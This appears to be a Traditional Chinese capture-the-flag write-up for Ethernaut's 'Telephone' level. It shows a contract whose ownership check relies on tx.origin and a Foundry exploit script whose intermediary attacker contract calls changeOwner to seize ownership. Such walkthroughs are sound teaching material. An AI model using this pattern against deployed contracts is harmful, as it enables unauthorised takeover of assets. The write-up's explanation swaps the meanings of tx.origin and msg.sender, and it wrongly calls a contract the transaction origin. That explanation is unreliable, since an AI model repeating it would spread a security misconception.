# Level 4 - Telephone
## 題目
[Telephone](https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446)

### 通關條件
取得下面合約的所有權，來完成這一關。
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
## 解題
這題合約不長，可以看到只要通過 12 行的判斷，就可以將 owner 改為自己。
`tx.origin` 跟 `msg.sender` 都是全域變數（[上一題](https://hackmd.io/@D13/ethernaut3)提到過）。`tx.origin` 是呼叫合約的地址，`msg.sender` 是啟動交易的地址。
假設你建立 A 合約去呼叫 B 合約，並且 B 合約再去呼叫 C 合約，那對 C 合約來說，`tx.origin` 是 A 的地址，`msg.sender` 是 B 的地址。
如果覺得解釋的不清楚，可以參考以下文章：
- [[中文] WTF Solidity 合约安全: S12. tx.origin钓鱼攻击](https://github.com/AmazingAng/WTF-Solidity/blob/main/S12_TxOrigin/readme.md)
- [[EN] The difference between tx.origin and msg.sender in Solidity, and how it changes with account abstraction](https://medium.com/@natelapinski/the-difference-between-tx-origin-60737d3b3ab5)

要解開這題，只要寫一個 script 呼叫另一個合約，再透過另一個合約呼叫題目合約的 `changeOwner()` 就可以過關了，攻擊合約如下
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/04_Telephone.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        TelephoneAttacker attacker = new TelephoneAttacker(your_challenge_address);    
        attacker.attack(myAddress);

        vm.stopBroadcast();
    }
}

contract TelephoneAttacker {
    Telephone public level04;
    
    constructor(address _target) {
        level04 = Telephone(_target);
    }
    
    function attack(address _newOwner) public {
        level04.changeOwner(_newOwner);
    }
}
```